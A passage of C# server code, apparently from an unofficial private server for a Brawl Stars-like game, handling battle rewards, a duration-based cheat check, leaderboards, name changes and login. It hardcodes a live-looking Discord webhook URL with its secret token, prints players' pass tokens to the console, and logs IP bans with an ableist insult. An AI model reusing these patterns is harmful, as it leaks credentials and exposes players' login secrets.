                    
                    switch (HomeMode.Avatar.PremiumLevel)
                    {
                        case 1: // vip maçın 4 de 1 i kupa
                            if (location.GameMode == "BountyHunter" || location.GameMode == "CoinRush" || location.GameMode == "AttackDefend" || location.GameMode == "LaserBall" || location.GameMode == "RoboWars" || location.GameMode == "KingOfHill")
                            {
                                underdogTrophiesResult += (int)Math.Floor((double)Trophies[0] / 4);
                                trophiesResult += (int)Math.Floor((double)Trophies[0] / 4);
                                HomeMode.Home.TrophiesReward = Math.Max(trophiesResult, 0);
                            }
                            else if (location.GameMode == "BattleRoyale" || location.GameMode == "BattleRoyaleTeam")
                            {
                                underdogTrophiesResult += (int)Math.Floor((double)Math.Abs(Trophies[message.Rank - 1]) / 4);
                                trophiesResult += (int)Math.Floor((double)Math.Abs(Trophies[message.Rank - 1]) / 4);
                                HomeMode.Home.TrophiesReward = Math.Max(trophiesResult, 0);
                            }
                            break;
                        /*case 3: // mega vip 3 kat kupa
                            if (location.GameMode == "BountyHunter" || location.GameMode == "CoinRush" || location.GameMode == "AttackDefend" || location.GameMode == "LaserBall" || location.GameMode == "RoboWars" || location.GameMode == "KingOfHill")
                            {
                                underdogTrophiesResult += (int)(Math.Floor((double)Trophies[0] * 2 * 1.5));
                                trophiesResult += (int)(Math.Floor((double)Trophies[0] * 2 * 1.5));
                            }
                            else if (location.GameMode == "BattleRoyale" || location.GameMode == "BattleRoyaleTeam")
                            {
                                underdogTrophiesResult += (int)(Math.Floor((double)Math.Abs(Trophies[message.Rank - 1]) * 2 * 1.5));
                                trophiesResult += (int)(Math.Floor((double)Math.Abs(Trophies[message.Rank - 1]) * 2 * 1.5));
                            }
                            break;
                        case 2: // ultra vip 2 kat kupa
                            if (location.GameMode == "BountyHunter" || location.GameMode == "CoinRush" || location.GameMode == "AttackDefend" || location.GameMode == "LaserBall" || location.GameMode == "RoboWars" || location.GameMode == "KingOfHill")
                            {
                                underdogTrophiesResult += (int)Math.Floor((double)Trophies[0]); // Verilen kupanın 2 katı
                                trophiesResult += (int)Math.Floor((double)Trophies[0]); // Verilen kupanın 2 katı
                            }
                            else if (location.GameMode == "BattleRoyale" || location.GameMode == "BattleRoyaleTeam")
                            {
                                underdogTrophiesResult += (int)Math.Floor((double)Math.Abs(Trophies[message.Rank - 1])); // Verilen kupanın 2 katı
                                trophiesResult += (int)Math.Floor((double)Math.Abs(Trophies[message.Rank - 1])); // Verilen kupanın 2 katı
                            }
                            break;
                        case 4: // developer 100x kupa
                            if (location.GameMode == "BountyHunter" || location.GameMode == "CoinRush" || location.GameMode == "AttackDefend" || location.GameMode == "LaserBall" || location.GameMode == "RoboWars" || location.GameMode == "KingOfHill")
                            {
                                underdogTrophiesResult += (int)(Math.Floor((double)Trophies[0] * 100));
                                trophiesResult += (int)(Math.Floor((double)Trophies[0] * 100));
                            }
                            else if (location.GameMode == "BattleRoyale" || location.GameMode == "BattleRoyaleTeam")
                            {
                                underdogTrophiesResult += (int)(Math.Floor((double)Math.Abs(Trophies[message.Rank - 1]) * 100));
                                trophiesResult += (int)(Math.Floor((double)Math.Abs(Trophies[message.Rank - 1]) * 100));
                            }
                            break;
                        */
                            //case 2:
                            //if (location.GameMode == "BountyHunter" || location.GameMode == "CoinRush" || location.GameMode == "AttackDefend" || location.GameMode == "LaserBall" || location.GameMode == "RoboWars" || location.GameMode == "KingOfHill")
                            //{
                            //   underdogTrophiesResult += (int)(Math.Floor((double)Trophies[0] / 2) + (Math.Round((double)Trophies[0] / 4)));
                            //   trophiesResult += (int)(Math.Floor((double)Trophies[0] / 2) + (Math.Round((double)Trophies[0] / 4)));
                            // }
                            //else if (location.GameMode == "BattleRoyale" || location.GameMode == "BattleRoyaleTeam")
                            //{
                            //       underdogTrophiesResult += (int)(Math.Floor((double)Math.Abs(Trophies[message.Rank - 1]) / 2) + (Math.Round((double)Math.Abs(Trophies[message.Rank - 1]) / 4)));
                            //      trophiesResult += (int)(Math.Floor((double)Math.Abs(Trophies[message.Rank - 1]) / 2) + (Math.Round((double)Math.Abs(Trophies[message.Rank - 1]) / 4)));
                            //  }
                            // break;

                    }
                    
                    HomeMode.Home.TrophiesReward = Math.Max(trophiesResult, 0);
                }

                if (HomeMode.Home.BattleTokens > 0)
                {
                    if (!(HomeMode.Home.BattleTokens - tokensResult >= 0))
                    {
                        tokensResult = HomeMode.Home.BattleTokens;
                        totalTokensResult += tokensResult;
                        HomeMode.Home.BattleTokens = 0;
                    }
                    else
                    {
                        HomeMode.Home.BattleTokens -= tokensResult;
                    }
                    if (HomeMode.Home.BattleTokensRefreshStart == new DateTime())
                    {
                        HomeMode.Home.BattleTokensRefreshStart = DateTime.UtcNow;
                    }
                }
                else
                {
                    tokensResult = 0;
                    totalTokensResult = 0;
                    HasNoTokens = true;
                }
                int starteh = HomeMode.Home.Experience;
                HomeMode.Home.Experience += experienceResult;
                HomeMode.Home.Experience += starExperienceResult;
                int endeh = HomeMode.Home.Experience;

                for (int i = 34; i < 500; i++)
                {
                    MilestoneData m = DataTables.Get(DataType.Milestone).GetDataByGlobalId<MilestoneData>(GlobalId.CreateGlobalId(39, i));
                    int trr = m.ProgressStart + m.Progress;
                    if (starteh < trr && endeh >= trr)
                    {
                        MilestoneReward = GlobalId.CreateGlobalId(39, i);
                        MilestoneRewards.Add(MilestoneReward);
                        HomeMode.Avatar.StarPoints += m.SecondaryLvlUpRewardCount;
                        HomeMode.Home.StarPointsGained += m.SecondaryLvlUpRewardCount;
                        totalTokensResult += m.PrimaryLvlUpRewardCount;
                        break;
                    }
                }

                int starth = hero.HighestTrophies;
                HomeMode.Avatar.AddTrophies(trophiesResult);
                hero.AddTrophies(trophiesResult);
                int endh = hero.HighestTrophies;
                for (int i = 0; i < 34; i++)
                {
                    MilestoneData m = DataTables.Get(DataType.Milestone).GetDataByGlobalId<MilestoneData>(GlobalId.CreateGlobalId(39, i));
                    int trr = m.ProgressStart + m.Progress;
                    if (starth < trr && endh >= trr)
                    {
                        MilestoneReward = GlobalId.CreateGlobalId(39, i);
                        MilestoneRewards.Add(MilestoneReward);
                        HomeMode.Avatar.StarPoints += m.SecondaryLvlUpRewardCount;
                        HomeMode.Home.StarPointsGained += m.SecondaryLvlUpRewardCount;
                        totalTokensResult += m.PrimaryLvlUpRewardCount;
                        break;
                    }
                }


                if (HomeMode.Home.TokenDoublers > 0)
                {
                    doubledTokensResult = Math.Min(totalTokensResult, HomeMode.Home.TokenDoublers);
                    HomeMode.Home.TokenDoublers -= doubledTokensResult;
                    totalTokensResult += doubledTokensResult;
                }
                HomeMode.Home.BrawlPassTokens += totalTokensResult;
                HomeMode.Home.TokenReward += totalTokensResult;
            }
            else
            {
                if (location.GameMode == "BountyHunter" || location.GameMode == "CoinRush" || location.GameMode == "AttackDefend" || location.GameMode == "LaserBall" || location.GameMode == "RoboWars")
                {
                    gameMode = 1;
                }
                else if (location.GameMode == "BattleRoyale")
                {
                    gameMode = 2;
                }
                else if (location.GameMode == "BattleRoyaleTeam")
                {
                    gameMode = 5;
                }
                else if (location.GameMode == "BossFight")
                {
                    gameMode = 4;
                }

            }
            //string r = "";
            string[] d = { "win", "lose", "draw" };
            double battleDuration = DateTime.UtcNow.Subtract(HomeMode.Avatar.BattleStartTime).TotalSeconds;

            if (location.GameMode.StartsWith("BattleRoyale")) //eğer hesaplaşma taşşağı ise
            {
                Logger.BLog($"Player {LogicLongCodeGenerator.ToCode(HomeMode.Avatar.AccountId)} ended battle! Battle Rank: {message.BattleResult} in {battleDuration}s gamemode: {location.GameMode}!");

             

                if (message.BattleResult != 5 && message.BattleResult != 6 && message.BattleResult != 7 && message.BattleResult != 8 && message.BattleResult != 9 && message.BattleResult != 10)
                {

                    if (battleDuration < 8)
                    {
                        var embedBuilder = new EmbedBuilder()
                           .WithTitle($"{HomeMode.Avatar.Name} maçı " + battleDuration + " sürede bitirdi")
                           .WithColor(Color.Blue)

                           .AddField("Player ID", LogicLongCodeGenerator.ToCode(HomeMode.Avatar.AccountId), true)
                           .AddField("Oyun Modu", location.GameMode, true)
                           .AddField("Kaçıncı bitirdi", message.BattleResult, true)
                           .AddField("Maç Süresi", battleDuration, true);


                        var embed = embedBuilder.Build();
                    https://discord.com/api/webhooks/1311835582971772978/DrSLBoCzymvY1lA6W4H778TbBkvJKUw0ckwT2O8GH2j3dEwzPt6YCJ0uhwz9FtVvGAen
                        MyDiscordBot.SendWebhookWithEmbed("https://discord.com/api/webhooks/1311835582971772978/DrSLBoCzymvY1lA6W4H778TbBkvJKUw0ckwT2O8GH2j3dEwzPt6YCJ0uhwz9FtVvGAen", embedBuilder);

                        var embedBuilderEn = new EmbedBuilder()
                             .WithTitle($"{HomeMode.Avatar.Name} was banned by Tale Brawl Cheat Systems.")
                             .WithColor(Color.Blue)

                             .AddField("Player ID", LogicLongCodeGenerator.ToCode(HomeMode.Avatar.AccountId), true)
                             .AddField("GameMode", location.GameMode, true)
                             .AddField("Place/Rank", message.BattleResult, true)
                             .AddField("Match Duration", battleDuration, true);

                        var embedEn = embedBuilder.Build();

                        // MyDiscordBot.SendWebhookWithEmbed("https://discord.com/api/webhooks/1273596818961469521/_Qqh4dp7SRhC5P8n5uiNwk2VTGYkpNPGaE_0gIqujXvj08EErcBaMupNr_pHCZd8hM9z", embedBuilderEn);


                        long dsaid = HomeMode.Avatar.AccountId;
                        Account plraccount = Accounts.Load(dsaid);
                        if (plraccount == null)
                        {
                            Console.WriteLine("Fail: account not found!");
                            return;
                        }

                        //  plraccount.Avatar.Banned = true;
                        // plraccount.Avatar.ResetTrophies();
                        //plraccount.Avatar.Name = "Account Banned";
                        /*Notification bdn = new()
                            {
                                Id = 81,
                                MessageEntry = "Hesabınız bazı nedenlerden dolayı devre dışı bırakıldı!\nEğer bunun bir hata olduğunu düşünüyorsanız yönetimle iletişime geçin!"
                            };
                            plraccount.Home.NotificationFactory.Add(bdn);*/
                        /*  if (Sessions.IsSessionActive(dsaid))
                          {
                              var session = Sessions.GetSession(dsaid);
                              session.GameListener.SendTCPMessage(new AuthenticationFailedMessage()
                              {
                                  Message = "Tale Brawl Hile Sistemleri tarafından yasaklandınız!"
                              });
                              Sessions.Remove(dsaid);
                          }*/



                    }
                }
            }
            else
            {
                Logger.BLog($"Player {LogicLongCodeGenerator.ToCode(HomeMode.Avatar.AccountId)} ended battle! Battle Result: {d[message.BattleResult]} in {battleDuration}s gamemode: {location.GameMode}!");


               
                if (message.BattleResult != 5 && message.BattleResult != 6 && message.BattleResult != 7 && message.BattleResult != 8 && message.BattleResult != 9 && message.BattleResult != 10)
                {

                    if (battleDuration < 8)
                    {
                        var embedBuilder = new EmbedBuilder()
                           .WithTitle($"{HomeMode.Avatar.Name} Tara Brawl Hile Sistemleri tarafından yasaklandı.")
                           .WithColor(Color.Blue)

                           .AddField("Player ID", LogicLongCodeGenerator.ToCode(HomeMode.Avatar.AccountId), true)
                           .AddField("Location", "Bilinmiyor", true)
                           .AddField("Maç Süresi", battleDuration, true);


                        var embed = embedBuilder.Build();

                         MyDiscordBot.SendWebhookWithEmbed("https://discord.com/api/webhooks/1311835582971772978/DrSLBoCzymvY1lA6W4H778TbBkvJKUw0ckwT2O8GH2j3dEwzPt6YCJ0uhwz9FtVvGAen", embedBuilder);

                        var embedBuilderEn = new EmbedBuilder()
                             .WithTitle($"{HomeMode.Avatar.Name} was banned by taRA Brawl Cheat Systems.")
                             .WithColor(Color.Blue)

                             .AddField("Player ID", LogicLongCodeGenerator.ToCode(HomeMode.Avatar.AccountId), true)
                             .AddField("Location", "Unknown", true)
                             .AddField("Match Duration", battleDuration, true);

                        var embedEn = embedBuilder.Build();

                        //MyDiscordBot.SendWebhookWithEmbed("https://discord.com/api/webhooks/1273596818961469521/_Qqh4dp7SRhC5P8n5uiNwk2VTGYkpNPGaE_0gIqujXvj08EErcBaMupNr_pHCZd8hM9z", embedBuilderEn);


                        long dsaid = HomeMode.Avatar.AccountId;
                        Account plraccount = Accounts.Load(dsaid);
                        if (plraccount == null)
                        {
                            Console.WriteLine("Fail: account not found!");
                            return;
                        }

                        //  plraccount.Avatar.Banned = true;
                        //  plraccount.Avatar.Name = "Account Banned";
                        /*Notification bdn = new()
                            {
                                Id = 81,
                                MessageEntry = "Hesabınız bazı nedenlerden dolayı devre dışı bırakıldı!\nEğer bunun bir hata olduğunu düşünüyorsanız yönetimle iletişime geçin!"
                            };
                            plraccount.Home.NotificationFactory.Add(bdn);*/
                        /*  if (Sessions.IsSessionActive(dsaid))
                          {
                              var session = Sessions.GetSession(dsaid);
                              session.GameListener.SendTCPMessage(new AuthenticationFailedMessage()
                              {
                                  Message = "Tale Brawl Hile Sistemleri tarafından yasaklandınız!"
                              });
                              Sessions.Remove(dsaid);
                          }*/
                    }
                }
            }

            HomeMode.Avatar.BattleStartTime = new();

            BattleEndMessage battleend = new()
            {
                GameMode = gameMode,
                Result = message.BattleResult,
                StarToken = starToken,
                IsPowerPlay = isPowerPlay,
                IsPvP = isPvP,
                pp = message.BattlePlayers,
                OwnPlayer = OwnPlayer,
                TrophiesReward = trophiesResult,
                ExperienceReward = experienceResult,
                StarExperienceReward = starExperienceResult,
                DoubledTokensReward = doubledTokensResult,
                TokenDoublersLeft = HomeMode.Home.TokenDoublers,
                TokensReward = tokensResult,
                Experience = StartExperience,
                MilestoneReward = MilestoneReward,
                ProgressiveQuests = q,
                UnderdogTrophies = underdogTrophiesResult,
                PowerPlayScoreGained = powerPlayScoreGained,
                PowerPlayEpicScoreGained = powerPlayEpicScoreGained,
                HasNoTokens = HasNoTokens,
                MilestoneRewards = MilestoneRewards,
            };

            Connection.Send(battleend);
        }


        private void GetLeaderboardReceived(GetLeaderboardMessage message)
        {
            if (message.LeaderboardType == 1)
            {
                Account[] rankingList = Leaderboards.GetAvatarRankingList();

                LeaderboardMessage leaderboard = new()
                {
                    LeaderboardType = 1,
                    Region = message.IsRegional ? "TR" : null
                };
                foreach (Account data in rankingList)
                {
                    leaderboard.Avatars.Add(new KeyValuePair<ClientHome, ClientAvatar>(data.Home, data.Avatar));
                }
                leaderboard.OwnAvatarId = Connection.Avatar.AccountId;

                Connection.Send(leaderboard);
            }
            else if (message.LeaderboardType == 2)
            {
                Alliance[] rankingList = Leaderboards.GetAllianceRankingList();

                LeaderboardMessage leaderboard = new()
                {
                    LeaderboardType = 2,
                    Region = message.IsRegional ? "TR" : null
                };
                leaderboard.AllianceList.AddRange(rankingList);

                Connection.Send(leaderboard);
            }
            else if (message.LeaderboardType == 0)
            {
                Dictionary<int, List<Account>> rankingList = Leaderboards.GetBrawlersRankingList();

                LeaderboardMessage leaderboard = new()
                {
                    LeaderboardType = 0,
                    Region = message.IsRegional ? "TR" : null,
                };
                Dictionary<ClientHome, ClientAvatar> aaaa = new();
                foreach (KeyValuePair<int, List<Account>> data in rankingList)
                {
                    if (data.Key == message.CharachterId)
                    {
                        foreach (Account account in data.Value)
                        {
                            aaaa.Add(account.Home, account.Avatar);
                        }

                    }
                }

                leaderboard.CharachterId = message.CharachterId;
                aaaa = aaaa.OrderBy(x => x.Value.GetHero(message.CharachterId).Trophies).Reverse().ToDictionary(x => x.Key, x => x.Value);
                aaaa = aaaa.Take(Math.Min(aaaa.Count, 200)).ToDictionary(kvp => kvp.Key, kvp => kvp.Value);
                leaderboard.Brawlers = aaaa;
                leaderboard.OwnAvatarId = Connection.Avatar.AccountId;
                Connection.Send(leaderboard);
            }
            else if (message.LeaderboardType == 3)
            {
                Account[] rankingList = Leaderboards.GetAvatarRankingList();

                LeaderboardMessage leaderboard = new()
                {
                    LeaderboardType = 3,
                    Region = message.IsRegional ? "TR" : null
                };
                foreach (Account data in rankingList)
                {
                    leaderboard.Avatars.Add(new KeyValuePair<ClientHome, ClientAvatar>(data.Home, data.Avatar));
                }
                leaderboard.OwnAvatarId = Connection.Avatar.AccountId;

                Connection.Send(leaderboard);
            }
        }

        private void GoHomeReceived(GoHomeMessage message)
        {
            if (Connection.Home != null && Connection.Avatar != null)
            {
                Connection.Home.Events = Events.GetEventsById(HomeMode.Home.PowerPlayGamesPlayed, Connection.Avatar.AccountId);
                OwnHomeDataMessage ohd = new OwnHomeDataMessage();
                ohd.Home = Connection.Home;
                ohd.Avatar = Connection.Avatar;
                Connection.Send(ohd);
                //BattleLogMessage kk = new BattleLogMessage();
                //Connection.Send(kk);
                //ShowLobbyInfo();
            }
        }

        private void ClientInfoReceived(ClientInfoMessage message)
        {
            UdpConnectionInfoMessage info = new UdpConnectionInfoMessage();
            info.SessionId = Connection.UdpSessionId;
            info.ServerAddress = Configuration.Instance.UdpHost;
            info.ServerPort = Configuration.Instance.UdpPort;
            Connection.Send(info);
        }

        private void CancelMatchMaking(CancelMatchmakingMessage message)
        {
            Matchmaking.CancelMatchmake(Connection);
            Connection.Send(new MatchMakingCancelledMessage());
        }

        private void MatchmakeRequestReceived(MatchmakeRequestMessage message)
        {
            int slot = message.EventSlot;

            if (HomeMode.Home.Character.Disabled)
            {
                Connection.Send(new OutOfSyncMessage());
                return;
            }

            if (!Events.HasSlot(slot))
            {
                slot = 1;
            }

            Matchmaking.RequestMatchmake(Connection, slot);
        }

        private void EndClientTurnReceived(EndClientTurnMessage message)
        {
            foreach (Command command in message.Commands)
            {
                if (!CommandManager.ReceiveCommand(command))
                {
                    OutOfSyncMessage outOfSync = new();
                    Connection.Send(outOfSync);
                }
            }
            HomeMode.ClientTurnReceived(message.Tick, message.Checksum, message.Commands);
        }

        private void GetPlayerProfile(GetPlayerProfileMessage message)
        {
            if (message.AccountId == 0)
            {
                Profile p = Profile.CreateConsole();
                PlayerProfileMessage a = new PlayerProfileMessage();
                a.Profile = p;

                Connection.Send(a);
                return;
            }
            Account data = Accounts.Load(message.AccountId);
            if (data == null) return;

            Profile profile = Profile.Create(data.Home, data.Avatar);

            PlayerProfileMessage profileMessage = new PlayerProfileMessage();
            profileMessage.Profile = profile;
            if (data.Avatar.AllianceId >= 0)
            {
                Alliance alliance = Alliances.Load(data.Avatar.AllianceId);
                if (alliance != null)
                {
                    profileMessage.AllianceHeader = alliance.Header;
                    profileMessage.AllianceRole = data.Avatar.AllianceRole;
                }
            }
            Connection.Send(profileMessage);
        }

        private void ChangeName(ChangeAvatarNameMessage message)
        {
            LogicChangeAvatarNameCommand command = new()
            {
                Name = message.Name,
                ChangeNameCost = 0
            };
            if (message.Name.Length < 2)
            {
                namefailed nf = new namefailed();
                Connection.Send(nf);
                return;
            }
            if (message.Name.StartsWith("<c"))
            {
                namefailed nf = new namefailed();
                Connection.Send(nf);
                return;
            }
            if (message.Name.Length > 15) //İSİM SINIRI YENİ EKLENMİSDİR.....
            {
                namefailed kk = new namefailed();
                Connection.Send(kk);
                File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                return;
            }
            var wordlist = new Wordlist("words.json");
            if (wordlist.ContainsBlockedWord(message.Name))
            {
                namefailed nf = new namefailed();
                Connection.Send(nf);
                return;
            }
            if (HomeMode.Avatar.AllianceId >= 0)
            {
                Alliance a = Alliances.Load(HomeMode.Avatar.AllianceId);
                if (a == null) return;
                AllianceMember m = a.GetMemberById(HomeMode.Avatar.AccountId);
                m.DisplayData.Name = message.Name;
            }
            command.Execute(HomeMode);
            AvailableServerCommandMessage serverCommandMessage = new()
            {
                Command = command
            };
            Connection.Send(serverCommandMessage);
        }

        private void OnChangeCharacter(int characterId)
        {
            TeamEntry team = Teams.Get(HomeMode.Avatar.TeamId);
            if (team == null) return;

            TeamMember member = team.GetMember(HomeMode.Avatar.AccountId);
            if (member == null) return;

            Hero hero = HomeMode.Avatar.GetHero(characterId);
            if (hero == null) return;
            member.CharacterId = characterId;
            member.HeroTrophies = hero.Trophies;
            member.HeroHighestTrophies = hero.HighestTrophies;
            member.HeroLevel = hero.PowerLevel;

            team.TeamUpdated();
        }
        private static readonly string BlockedIpsFilePath = "blocked_ips.txt";

        private void LoginReceived(AuthenticationMessage message)
        {
            Account account = null;

            Console.WriteLine("AccountId:" + message.AccountId);
            Console.WriteLine("PassToken:" + message.PassToken);
            Console.WriteLine("Majorsurum:" + message.Majorsurum);
            Console.WriteLine("Minorsurum:" + message.Minorsurum);
            Console.WriteLine("Buildsurum:" + message.Buildsurum);
            Console.WriteLine("DeviceId:" + message.DeviceId);
            //Console.WriteLine("Device:" + message.Device);
            Console.WriteLine("DeviceLang:" + message.DeviceLang);
            Console.WriteLine("Sha:" + message.Sha);
            Console.WriteLine("Android:" + message.Android);
            Console.WriteLine("Dil:" + message.korunmalar);

            if (message.DeviceId.Contains("GOVNO"))
            {
                Console.WriteLine("govno"); return;
            }

            /*if (message.DeviceId.Contains("Tai Marusiak"))
            {
                Console.WriteLine("govno"); return;
            }*/

            //  Console.WriteLine(message.Sha);
            //  Console.WriteLine(message.DeviceLang);


            /* if (message.Sha == null || message.Sha == "")
             {
                 Console.WriteLine("hesap spamı engellendi, sha");
                 File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });



                 return;
             }
             if (message.DeviceLang == null)
             {
                 Console.WriteLine("hesap spamı engellendi, sha");
                 File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });

                 return;
             }*/
            if (message.PassToken != "")
            {
                /*if (message.Sha == null || message.Sha == "")
                {
                    Console.WriteLine("hesap spamı engellendi, sha");
                    File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]});

                    

                    return;
                }
                if (message.DeviceLang == null) {
                    Console.WriteLine("hesap spamı engellendi, sha");
                    File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });

                    return;
                }*/
                if (message.DeviceId != null)
                {
                    /*if (message.Device == "M2101K7BG" || message.DeviceId == "M2101K7BG")
                    {
                        if (account.AccountId != 98)
                        {


                            AuthenticationFailedMessage loginFailed = new AuthenticationFailedMessage();
                            loginFailed.ErrorCode = 1;
                            loginFailed.Message = "grkler....";
                            Connection.Send(loginFailed);

                            Console.WriteLine("grk"); Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            Console.WriteLine("grk");
                            return;
                        }
                    }*/

                    if (message.AccountId == 0)
                    {
                        account = Accounts.Create();
                    }
                    else
                    {
                        account = Accounts.Load(message.AccountId);
                        if (account.PassToken != message.PassToken)
                        {
                            account = null;
                        }
                    }

                    if (account == null)
                    {

                        AuthenticationFailedMessage loginFailed = new AuthenticationFailedMessage();
                        loginFailed.ErrorCode = 1;
                        loginFailed.Message = "Lütfen uygulama verilerini sıfırlayıp girin.";
                        Connection.Send(loginFailed);

                        return;
                    }


                    if (account.Avatar.Banned)
                    {
                        AuthenticationFailedMessage loginFailed = new AuthenticationFailedMessage
                        {
                            ErrorCode = 1,
                            Message = "BANNED!"
                        };
                        Connection.Send(loginFailed);
                        return;
                    }
                    
                    if (message.Majorsurum != 29)
                    {
                        AuthenticationFailedMessage loginFailed = new AuthenticationFailedMessage
                        {
                            ErrorCode = 8,
                            Message = "Oyun güncel değil!\nGame is outdated!",
                            porno = "T.ME/TARASERVERS" // yeni apk linki redirect
                        };
                        Connection.Send(loginFailed);
                        return;
                    }
                    /*if (message.Buildsurum != 1)
                    {
                        File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                        Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                        return;
                    }*/
                    if (message.Minorsurum != 258)
                    {
                        AuthenticationFailedMessage loginFailed = new AuthenticationFailedMessage
                        {
                            ErrorCode = 8,
                            Message = "Oyun güncel değil!\nGame is outdated!",
                            porno = "T.ME/TARASERVERS" // yeni apk linki redirect
                        };
                        Connection.Send(loginFailed);
                        return;
                    }

                    if (
    message.Android == "0" ||
    message.Android == "1" ||
    message.Android == "2" ||
    message.Android == "3" ||
    message.Android == "4" ||
    message.Android == "5" ||
    message.Android == "6" ||
    message.Android == "16" ||
    message.Android == "17" ||
    message.Android == "18" ||
    message.Android == "19" ||
    message.Android == "20" ||
    message.Android == "21" ||
    message.Android == "22" ||
    message.Android == "23" ||
    message.Android == "24" ||
    message.Android == "25" ||
    message.Android == "26" ||
    message.Android == "27" ||
    message.Android == "28" ||
    message.Android == "29" ||
    message.Android == "30" ||
    message.Android == "31" ||
    message.Android == "32" ||
    message.Android == "33" ||
    message.Android == "34" ||
    message.Android == "35" ||
    message.Android == "36" ||
    message.Android == "37" ||
    message.Android == "38" ||
    message.Android == "39" ||
    message.Android == "40" ||
    message.Android == "41" ||
    message.Android == "42" ||
    message.Android == "43" ||
    message.Android == "44" ||
    message.Android == "45" ||
    message.Android == "46" ||
    message.Android == "47" ||
    message.Android == "48" ||
    message.Android == "49" ||
    message.Android == "50" ||
    message.Android == "51" ||
    message.Android == "52" ||
    message.Android == "53" ||
    message.Android == "54" ||
    message.Android == "55" ||
    message.Android == "56" ||
    message.Android == "57" ||
    message.Android == "58" ||
    message.Android == "59" ||
    message.Android == "60" ||
    message.Android == "61" ||
    message.Android == "62" ||
    message.Android == "63" ||
    message.Android == "64" ||
    message.Android == "65" ||
    message.Android == "66" ||
    message.Android == "67" ||
    message.Android == "68" ||
    message.Android == "69" ||
    message.Android == "70" ||
    message.Android == "71" ||
    message.Android == "72" ||
    message.Android == "73" ||
    message.Android == "74" ||
    message.Android == "75" ||
    message.Android == "76" ||
    message.Android == "77" ||
    message.Android == "78" ||
    message.Android == "79" ||
    message.Android == "80" ||
    message.Android == "81" ||
    message.Android == "82" ||
    message.Android == "83" ||
    message.Android == "84" ||
    message.Android == "85" ||
    message.Android == "86" ||
    message.Android == "87" ||
    message.Android == "88" ||
    message.Android == "89" ||
    message.Android == "90" ||
    message.Android == "91" ||
    message.Android == "92" ||
    message.Android == "93" ||
    message.Android == "94" ||
    message.Android == "95" ||
    message.Android == "96" ||
    message.Android == "97" ||
    message.Android == "98" ||
    message.Android == "99" ||
    message.Android == "100"
)
                    {
                        //File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                       // Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                      //  return;
                    }


                    /*if (message.Android == "0" && message.Android == "1" && message.Android == "2" && message.Android == "3" && message.Android == "4" && message.Android == "5" && message.Android == "16" && message.Android == "17" )
                    {
                        File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                        Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                        return;
                    };*/

                    if (message.Buildsurum == null) //boşluk koruma bosluk koruma
                    {
                        File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                        Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                        return;
                    }
                    if (message.Minorsurum == null)
                    {
                        File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                        Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                        return;
                    }
                    if (message.Majorsurum == null)
                    {
                        File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                        Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                        return;
                    }
                    if (message.DeviceLang == null)
                    {
                        File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                        Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                        return;
                    }
                    if (message.Android == null)
                    {
                        File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                        Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                        return;
                    }
                    if (message.Sha == null || message.Sha == "")
                    {
                        File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                        Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                        return;
                    }
                    if (message.DeviceId == null || message.DeviceId == "")
                    {
                        File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
